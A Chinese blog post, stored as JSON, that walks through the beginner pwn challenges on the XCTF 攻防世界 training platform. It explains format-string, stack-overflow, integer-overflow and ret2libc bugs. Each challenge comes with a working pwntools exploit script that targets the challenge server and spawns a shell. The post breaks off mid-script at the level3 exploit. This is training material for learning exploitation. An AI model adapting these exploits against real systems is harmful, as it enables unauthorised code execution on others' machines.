{"title":"攻防世界闯关记录_pwn新手区","slug":"攻防世界闯关记录_pwn新手区","date":"2019-09-25T09:26:37.000Z","updated":"2021-02-22T15:52:29.772Z","comments":true,"path":"api/articles/攻防世界闯关记录_pwn新手区.json","photos":[],"link":"","excerpt":" [Figure]   开个新坑，记录自己刷XCTF攻防世界的pwn题，因为刚入门吧，从新手篇开始练起。这次一边做题一边写笔记和writeup，巩固一下自己学到的东西。","covers":["../static/images/2019-10-02-15-11-09.png","../static/images/2019-09-25-17-35-39.png","../static/images/2019-09-25-17-36-47.png","../static/images/2019-09-25-17-41-06.png","../static/images/2019-09-25-17-42-56.png","../static/images/2019-09-25-17-47-44.png","../static/images/2019-09-25-17-59-28.png","../static/images/2019-09-26-19-22-12.png","../static/images/2019-09-26-19-29-05.png","../static/images/2019-09-26-19-32-14.png","../static/images/2019-09-26-19-33-15.png","../static/images/2019-09-27-21-36-40.png","../static/images/2019-09-27-21-38-03.png","../static/images/2019-10-05-16-38-50.png","../static/images/2019-10-02-13-46-29.png","../static/images/2019-10-02-13-50-25.png","../static/images/2019-10-02-13-55-32.png","../static/images/2019-10-02-13-56-08.png","../static/images/2019-10-02-13-58-58.png","../static/images/2019-10-02-14-00-35.png","../static/images/2019-10-02-14-11-38.png","../static/images/2019-10-02-14-18-46.png","../static/images/2019-10-02-14-21-09.png","../static/images/2019-10-02-14-24-26.png","../static/images/2019-10-02-14-27-03.png","../static/images/2019-10-02-14-28-51.png","../static/images/2019-10-02-14-34-29.png","../static/images/2019-10-02-14-35-48.png","../static/images/2019-10-02-14-36-42.png"],"content":"<p><img src=\"../static/images/2019-10-02-15-11-09.png\" alt=\"\" /></p>\n<p>  开个新坑，记录自己刷XCTF攻防世界的pwn题，因为刚入门吧，从新手篇开始练起。这次一边做题一边写笔记和writeup，巩固一下自己学到的东西。</p>\n<span id=\"more\"></span>\n<h2 id=\"get_shell\"><a class=\"markdownIt-Anchor\" href=\"#get_shell\"></a> get_shell</h2>\n<p>  这道题我不太想写writeup……做过的人肯定明白</p>\n<h2 id=\"cgfsb\"><a class=\"markdownIt-Anchor\" href=\"#cgfsb\"></a> CGfsb</h2>\n<p>  这道题其实是一道非常简单的格式化字符串题，凭借着自己对格式化字符串的记忆，以及大量动态调试，最后还是把这道题做出来了。记录一下自己调试的过程吧，随便找一篇格式化字符串的原理介绍（其实我没看，不过自称是春秋的应该不会太差）：<br />\n<a href=\"https://www.cnblogs.com/ichunqiu/p/9329387.html\">https://www.cnblogs.com/ichunqiu/p/9329387.html</a></p>\n<p>  先运行一下看看逻辑吧：</p>\n<p><img src=\"../static/images/2019-09-25-17-35-39.png\" alt=\"\" /></p>\n<p>  就是先让你输入一下名字和信息，然后它会再打印出来，我们可以看一下源码：</p>\n<p><img src=\"../static/images/2019-09-25-17-36-47.png\" alt=\"\" /></p>\n<p>  标红处可以明显发现有一处格式化字符串漏洞，然后这道题的逻辑是把pwnme的内容修改为8，我们可以很容易想到（说这话心虚，其实动调了半天才想到，主要忘记格式化字符串怎么用了……）在输入名字的时候写pwnme的地址，然后在输入message时使用格式化字符串漏洞把pwnme修改掉。打开r2查看pwnme变量的地址（使用的命令是is）：</p>\n<p><img src=\"../static/images/2019-09-25-17-41-06.png\" alt=\"\" /></p>\n<p>  随后使用gdb（安装了pwndbg插件）进行动态调试，先给0x80486d2地址打个断点：</p>\n<p><img src=\"../static/images/2019-09-25-17-42-56.png\" alt=\"\" /></p>\n<p>  为什么给这个地址打断点呢？因为这个地址是printf执行完成后的第一个指令，我们在这个地方打断点，出来以后方便观察栈内存中的情况。运行一次程序，我们在name处输入test（就是为了测试message，现在name对我调试毫无意义），在message里输入%20s%1$n，看看栈里那个地方被改成了0x14（执行命令用r，我们输入完毕后会运行到断点处）：</p>\n<p><img src=\"../static/images/2019-09-25-17-47-44.png\" alt=\"\" /></p>\n<p>  看见栈中第二个位置所指向的地址内容被修改掉了。我们再运行一次，这次name输入的还是test(十六进制下的内容会变成：74657374a)<br />\n，message输入%20s%2<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>n</mi><mi mathvariant=\"normal\">（</mi><mi mathvariant=\"normal\">变</mi><mi mathvariant=\"normal\">成</mi><mn>2</mn></mrow><annotation encoding=\"application/x-tex\">n（变成2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">n</span><span class=\"mord cjk_fallback\">（</span><span class=\"mord cjk_fallback\">变</span><span class=\"mord cjk_fallback\">成</span><span class=\"mord\">2</span></span></span></span>是为了不改掉test的值）：</p>\n<p><img src=\"../static/images/2019-09-25-17-59-28.png\" alt=\"\" /></p>\n<p>由于test前两个字节是7465，我们可以看到有两个字节写到了0xffffcdbc处，所以在写入pwnme地址之前我们需要填充两个字节，确保0xffffcdc0处可以被写成pwnme的地址，这样使用%$8n可以写入到此位置（与esp之间的差值为4的倍数），写exp如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#encoding:utf-8</span><br><span class=\"line\">&#39;&#39;&#39;</span><br><span class=\"line\">    @Author:\tb0ring</span><br><span class=\"line\">    @MySite:\thttps:&#x2F;&#x2F;blog.b0ring.cf&#x2F;</span><br><span class=\"line\">    @Date:\t\t2019-09-29 09:59:02</span><br><span class=\"line\">    @Version:\t1.0.0</span><br><span class=\"line\">&#39;&#39;&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\">#p &#x3D; process(&quot;CGfsb&quot;)</span><br><span class=\"line\">p &#x3D; remote(&quot;111.198.29.45&quot;,31983)</span><br><span class=\"line\">payload_1 &#x3D; &quot;aa&quot; + p32(pwnme_addr)</span><br><span class=\"line\">p.sendlineafter(&quot;please tell me your name:\\n&quot;,payload_1)</span><br><span class=\"line\">payload_2 &#x3D; &quot;%8s%8$n&quot;</span><br><span class=\"line\">p.sendlineafter(&quot;leave your message please:\\n&quot;,payload_2)                                               </span><br><span class=\"line\">p.interactive()                                       </span><br></pre></td></tr></table></figure>\n<h2 id=\"when_did_you_born\"><a class=\"markdownIt-Anchor\" href=\"#when_did_you_born\"></a> when_did_you_born</h2>\n<p>  这道题其实挺简单的，只不过……在做题过程中蠢了一下，浪费了不少时间。我们先使用IDA分析一下源程序：</p>\n<p><img src=\"../static/images/2019-09-26-19-22-12.png\" alt=\"\" /></p>\n<p>  首先程序的逻辑是这样的，你输入出生年份，一旦等于1926就会退出。然后让你填名字，输出你名字后再判断你是不是1926年出生，如果你是1926年出生就会给你flag。<br />\n  最开始的时候看错了，以为v4（存储名字的变量）覆盖不到v5上，然后懵逼了很久（吃一堑长一智，以后不能犯这种错误了）。然后研究了半天怎么整数溢出啥的，随后实现想不到就看了别人的wp，发现真的是用v4覆盖v5，唉……exp如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#encoding:utf-8</span><br><span class=\"line\">&#39;&#39;&#39;</span><br><span class=\"line\">    @Author:\tb0ring</span><br><span class=\"line\">    @MySite:\thttps:&#x2F;&#x2F;blog.b0ring.cf&#x2F;</span><br><span class=\"line\">    @Date:\t\t2019-09-29 09:59:02</span><br><span class=\"line\">    @Version:\t1.0.0</span><br><span class=\"line\">&#39;&#39;&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">#p &#x3D; process(&quot;when_did_you_born&quot;)</span><br><span class=\"line\">p &#x3D; remote(&quot;111.198.29.45&quot;,49187)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&quot;What&#39;s Your Birth?\\n&quot;,&quot;1997&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&quot;What&#39;s Your Name?\\n&quot;,&quot;a&quot;*8+p64(1926))</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"hello_pwn\"><a class=\"markdownIt-Anchor\" href=\"#hello_pwn\"></a> hello_pwn</h2>\n<p>  这道题也相当简单，脚本都不用写，但还是分析一下吧。用IDA看一下源码：</p>\n<p><img src=\"../static/images/2019-09-26-19-29-05.png\" alt=\"\" /></p>\n<p>  就是你往unk_601068输入16个字符，它会判断dword_60106c（此地址比输入的地址高4位）是不是等于&quot;nuaa&quot;，如果等于就会给你flag。其实只要输入4个字符填充好0x601068，后四个字符就会覆盖掉0x60106c。这里要注意大端序小端序的问题，总之输入的内容是反过来的，最终payload为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1234aaun</span><br></pre></td></tr></table></figure>\n<h2 id=\"level0\"><a class=\"markdownIt-Anchor\" href=\"#level0\"></a> level0</h2>\n<p>  这道题难度真的是level0，反正是最简单的栈溢出了，用IDA分析一下：</p>\n<p><img src=\"../static/images/2019-09-26-19-32-14.png\" alt=\"\" /></p>\n<p>  可以瞬间看到一个非常明显的栈溢出，偏移是0x80。而且它还给了利用函数：</p>\n<p><img src=\"../static/images/2019-09-26-19-33-15.png\" alt=\"\" /></p>\n<p>所以直接利用就好，exp：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#encoding:utf-8</span><br><span class=\"line\">&#39;&#39;&#39;</span><br><span class=\"line\">    @Author:\tb0ring</span><br><span class=\"line\">    @MySite:\thttps:&#x2F;&#x2F;blog.b0ring.cf&#x2F;</span><br><span class=\"line\">    @Date:\t\t2019-09-29 09:59:02</span><br><span class=\"line\">    @Version:\t1.0.0</span><br><span class=\"line\">&#39;&#39;&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">#p &#x3D; process(&quot;.&#x2F;level0&quot;)</span><br><span class=\"line\">p &#x3D; remote(&quot;111.198.29.45&quot;,53314)</span><br><span class=\"line\"></span><br><span class=\"line\">call_system_addr &#x3D; 0x00400596</span><br><span class=\"line\"></span><br><span class=\"line\">payload &#x3D; &#39;a&#39; * 136</span><br><span class=\"line\">payload +&#x3D; p64(call_system_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&quot;Hello, World\\n&quot;,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"level2\"><a class=\"markdownIt-Anchor\" href=\"#level2\"></a> level2</h2>\n<p>  用IDA先分析一下源码：</p>\n<p><img src=\"../static/images/2019-09-27-21-36-40.png\" alt=\"\" /></p>\n<p>  buf只有0x88的空间，可见此处明显会存在溢出。查看一下保护机制：</p>\n<p><img src=\"../static/images/2019-09-27-21-38-03.png\" alt=\"\" /></p>\n<p>  没canary，我们查看一下有没有可以利用的函数和字符串吧：</p>\n<p><img src=\"../static/images/2019-10-05-16-38-50.png\" alt=\"\" /></p>\n<p>  可见system函数是程序自己会调用的，也有/bin/sh的字符串，直接利用就行，exp如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#encoding:utf-8</span><br><span class=\"line\">&#39;&#39;&#39;</span><br><span class=\"line\">    @Author:\tb0ring</span><br><span class=\"line\">    @MySite:\thttps:&#x2F;&#x2F;blog.b0ring.cf&#x2F;</span><br><span class=\"line\">    @Date:\t\t2019-09-29 09:59:02</span><br><span class=\"line\">    @Version:\t1.0.0</span><br><span class=\"line\">&#39;&#39;&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">#p &#x3D; process(&quot;level2&quot;)</span><br><span class=\"line\">p &#x3D; remote(&quot;111.198.29.45&quot;,40649)</span><br><span class=\"line\">elf &#x3D; ELF(&quot;level2&quot;)</span><br><span class=\"line\">bin_sh_addr &#x3D; 0x0804a024</span><br><span class=\"line\">system_addr &#x3D; elf.plt[&#39;system&#39;]</span><br><span class=\"line\"></span><br><span class=\"line\">payload &#x3D; &#39;a&#39;*140</span><br><span class=\"line\">payload +&#x3D; p32(system_addr) + p32(1) + p32(bin_sh_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&quot;Input:\\n&quot;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"guess_num\"><a class=\"markdownIt-Anchor\" href=\"#guess_num\"></a> guess_num</h2>\n<p>  这是个很有意思的题目，似乎从某年的ctf出过一道骰子的逆向题以后大家都喜欢玩骰子，我本科出校ctf题的时候其实也喜欢玩骰子。废话不多说了，我们来分析一下源代码吧：</p>\n<p><img src=\"../static/images/2019-10-02-13-46-29.png\" alt=\"\" /></p>\n<p>  可见程序大致的逻辑是：输入名字-&gt;丢10次骰子，丢错一次就会GG，如果十次都成功的话就可以拿到flag。其实有点儿更像逆向题了。不过我们此处可以利用输入名字时使用gets函数来覆盖掉seed的值，以操控种子来使随机数数列成为我们所可控的序列。关于name需要多长，我们可以观察堆栈空间：</p>\n<p><img src=\"../static/images/2019-10-02-13-50-25.png\" alt=\"\" /></p>\n<p>  大致需要0x3C-0x10的长度，也可能在真正运行时比我们预计的更长。由于此处偷懒没有使用动态调试，直接覆盖了60个重复的’a’，然后编写一个C语言程序，使用0x61616161作为种子来生成随机数列，源码如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;stdlib.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()&#123;</span><br><span class=\"line\">        char *a &#x3D; &quot;aaaaaaaa&quot;;</span><br><span class=\"line\">        srand(0x61616161);</span><br><span class=\"line\">        for(int i&#x3D;0;i&lt;&#x3D;9;i++)&#123;</span><br><span class=\"line\">                int test &#x3D; rand()%6 + 1;</span><br><span class=\"line\">                printf(&quot;%d\\n&quot;,test);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>  查看随机生成的序列：</p>\n<p><img src=\"../static/images/2019-10-02-13-55-32.png\" alt=\"\" /></p>\n<p>  然后照着这个顺序输入就可以了：</p>\n<p><img src=\"../static/images/2019-10-02-13-56-08.png\" alt=\"\" /></p>\n<h2 id=\"int_overflow\"><a class=\"markdownIt-Anchor\" href=\"#int_overflow\"></a> int_overflow</h2>\n<p>  这道题还是略微有点儿意思的。先让我们查看一下保护机制吧：</p>\n<p><img src=\"../static/images/2019-10-02-13-58-58.png\" alt=\"\" /></p>\n<p>  没有canary，比较容易进行栈溢出操作，来分析一下源码(直接把漏洞点贴出来吧)：</p>\n<p><img src=\"../static/images/2019-10-02-14-00-35.png\" alt=\"\" /></p>\n<p>  漏洞点在于此处这个验证密码的位置，首先程序会获取输入字符串的长度，并存于一个__int8类型的变量中，实际上，这个__int8变量最多可以存储256大小的数字。如果这个数字为257，那么在内存中查看的话其大小就变成了257-256=1。也就是说，我们输入一个长度为256+4~256+8长度之内的字符串，就可以溢出s，来进行ROP操作。exp如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#encoding:utf-8</span><br><span class=\"line\">&#39;&#39;&#39;</span><br><span class=\"line\">    @Author:\tb0ring</span><br><span class=\"line\">    @MySite:\thttps:&#x2F;&#x2F;blog.b0ring.cf&#x2F;</span><br><span class=\"line\">    @Date:\t\t2019-09-29 09:59:02</span><br><span class=\"line\">    @Version:\t1.0.0</span><br><span class=\"line\">&#39;&#39;&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">shell_addr &#x3D; 0x0804868b</span><br><span class=\"line\"></span><br><span class=\"line\">#p &#x3D; process(&quot;.&#x2F;int_overflow&quot;)</span><br><span class=\"line\">p &#x3D; remote(&quot;111.198.29.45&quot;,34095)</span><br><span class=\"line\"></span><br><span class=\"line\">payload &#x3D; 0x14*&#39;a&#39; + 4*&#39;a&#39; + p32(shell_addr) + (256-0x14-4-4)*&#39;a&#39; + 4*&#39;a&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&quot;Your choice:&quot;,&quot;1&quot;)</span><br><span class=\"line\">p.sendlineafter(&quot;Please input your username:\\n&quot;,&quot;test&quot;)</span><br><span class=\"line\">p.sendlineafter(&quot;Please input your passwd:\\n&quot;,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"cgpwn2\"><a class=\"markdownIt-Anchor\" href=\"#cgpwn2\"></a> cgpwn2</h2>\n<p>  这是一道很基本的栈溢出题目，分析一下源码吧：</p>\n<p><img src=\"../static/images/2019-10-02-14-11-38.png\" alt=\"\" /></p>\n<p>  漏洞点就在此处，name是使用堆进行存储的，而message是使用栈中的s字符串来存储的，使用了不安全的gets函数，我们直接把返回地址覆盖成system，然后参数调用name，再在name中输入我们想执行的命令就行了,exp如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#encoding:utf-8</span><br><span class=\"line\">&#39;&#39;&#39;</span><br><span class=\"line\">    @Author:\tb0ring</span><br><span class=\"line\">    @MySite:\thttps:&#x2F;&#x2F;blog.b0ring.cf&#x2F;</span><br><span class=\"line\">    @Date:\t\t2019-09-29 09:59:02</span><br><span class=\"line\">    @Version:\t1.0.0</span><br><span class=\"line\">&#39;&#39;&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">#p &#x3D; process(&quot;cgpwn2&quot;)</span><br><span class=\"line\">p &#x3D; remote(&quot;111.198.29.45&quot;,50695)</span><br><span class=\"line\">elf &#x3D; ELF(&quot;cgpwn2&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">name &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class=\"line\">system_addr &#x3D; elf.plt[&quot;system&quot;]</span><br><span class=\"line\">name_addr &#x3D; 0x0804A080</span><br><span class=\"line\">message &#x3D; &quot;a&quot; * 42 + p32(system_addr) + p32(0) + p32(name_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&quot;please tell me your name\\n&quot;,name)</span><br><span class=\"line\">p.sendlineafter(&quot;hello,you can leave some message here:&quot;,message)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"string\"><a class=\"markdownIt-Anchor\" href=\"#string\"></a> string</h2>\n<p>  这道题相当相当有意思，作为菜鸡一枚，没有查wp的情况下做了得有两个多小时才做出来。可能是新手区里最有意思的一道题目了，因此打算详细讲讲，我们想从入口处分析一下源码吧：</p>\n<p><img src=\"../static/images/2019-10-02-14-18-46.png\" alt=\"\" /></p>\n<p>  此处我刚开始没有摸到头脑，仔细看会发现，v3首先申请了8大小的内存空间，然后在前4个空间中存放了数字68，在后四个空间中存放了数字85。而v4中存放的是v3的内容，并不是68、和85两个数字，而是存放这两个数字的内存空间的地址。在后面会很有用。</p>\n<p>  接下来让我们分析一下0x400D72处这个函数：</p>\n<p><img src=\"../static/images/2019-10-02-14-21-09.png\" alt=\"\" /></p>\n<p>  这里使用了scanf(&quot;%s&quot;)来进行读取操作，看似是危险函数，然而由于对字符串长度进行了检验并且开启了canary，实际上是无法利用的。想利用还得继续看其调用的其他函数：</p>\n<p><img src=\"../static/images/2019-10-02-14-24-26.png\" alt=\"\" /></p>\n<p>  反正第一次就得输入east了，没得选。在接着看sub_400BB9这个函数：</p>\n<p><img src=\"../static/images/2019-10-02-14-27-03.png\" alt=\"\" /></p>\n<p>  这个地方选1的话会写入一个地址，然后第二个输入点存在格式化字符串漏洞，我们可以对某空间进行任意写操作。我们可以记住此处。然后再接着看第三个调用的函数：</p>\n<p><img src=\"../static/images/2019-10-02-14-28-51.png\" alt=\"\" /></p>\n<p>  其中a1存放的是v3的地址，就是我们v3申请的内存大小为8的内存空间。理顺思路，这里如果我们可以使这8内存的空间中的前四个字节和后四个字节相等，就可以打shellcode。于是我们可以理顺思路，在最开始时拿到两个4字节的地址-&gt;v3[0]和v3[1]的地址，然后在之后的函数中将其中一个修改成和另一个相同-&gt;再在此处打shellcode。exp如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#encoding:utf-8</span><br><span class=\"line\">&#39;&#39;&#39;</span><br><span class=\"line\">    @Author:\tb0ring</span><br><span class=\"line\">    @MySite:\thttps:&#x2F;&#x2F;blog.b0ring.cf&#x2F;</span><br><span class=\"line\">    @Date:\t\t2019-09-29 09:59:02</span><br><span class=\"line\">    @Version:\t1.0.0</span><br><span class=\"line\">&#39;&#39;&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal &#x3D; [&#39;deepin-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]</span><br><span class=\"line\">context(arch&#x3D;&#39;amd64&#39;, os&#x3D;&#39;linux&#39;)</span><br><span class=\"line\">#p &#x3D; process(&quot;.&#x2F;string&quot;)</span><br><span class=\"line\">#gdb.attach(proc.pidof(p)[0])</span><br><span class=\"line\">p &#x3D; remote(&quot;111.198.29.45&quot;,42101)</span><br><span class=\"line\"></span><br><span class=\"line\">print p.recvuntil(&quot;secret[0] is &quot;)</span><br><span class=\"line\">after_content &#x3D; p.recvuntil(&quot;What should your character&#39;s name be:\\n&quot;)</span><br><span class=\"line\">print after_content</span><br><span class=\"line\"></span><br><span class=\"line\">secret_addr &#x3D; int(after_content.split(&#39;\\n&#39;)[0],16)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(&quot;test&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">addr_wanted &#x3D; str(secret_addr)</span><br><span class=\"line\">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class=\"line\">print(&quot;[*] addr_wanted:&quot;,addr_wanted)</span><br><span class=\"line\"></span><br><span class=\"line\">print p.sendlineafter(&quot;So, where you will go?east or up?:\\n&quot;,&quot;east&quot;)</span><br><span class=\"line\">print p.sendlineafter(&quot;go into there(1), or leave(0)?:&quot;,&quot;1&quot;)</span><br><span class=\"line\">print p.sendlineafter(&quot;&#39;Give me an address&#39;\\n&quot;,addr_wanted)</span><br><span class=\"line\">print p.sendlineafter(&quot;And, you wish is:\\n&quot;,&quot;%85s%7$n&quot;)</span><br><span class=\"line\">print p.recvuntil(&quot;Wizard: I will help you! USE YOU SPELL\\n&quot;)</span><br><span class=\"line\">p.sendline(shellcode)</span><br><span class=\"line\">#print p.sendlineafter(&quot;Wizard: I will help you! USE YOU SPELL\\n&quot;,shellcode)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"level3\"><a class=\"markdownIt-Anchor\" href=\"#level3\"></a> level3</h2>\n<p>  先来看看保护机制吧：</p>\n<p><img src=\"../static/images/2019-10-02-14-34-29.png\" alt=\"\" /></p>\n<p>  这里没有canary保护，猜测其存在一个比较好利用的栈溢出漏洞。我们分析一下源代码：</p>\n<p><img src=\"../static/images/2019-10-02-14-35-48.png\" alt=\"\" /></p>\n<p>  这里的栈溢出漏洞相当明显，接下来就是思考如何制造rop了。</p>\n<p><img src=\"../static/images/2019-10-02-14-36-42.png\" alt=\"\" /></p>\n<p>  这个函数既没有system函数，也没有是/bin/sh字符串，不过它使用了write函数，我们可以很方便的泄露一些敏感的地址信息。然后使用题目所给的libc文件计算偏移，再输出了write函数地址后，减去libc中write函数的地址来计算基址，再加上/bin/sh的偏移和system函数的偏移，就可以计算出我们需要的两个关键内容了。然后在rop中返回到vul_func再调用system函数。具体利用的exp如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span 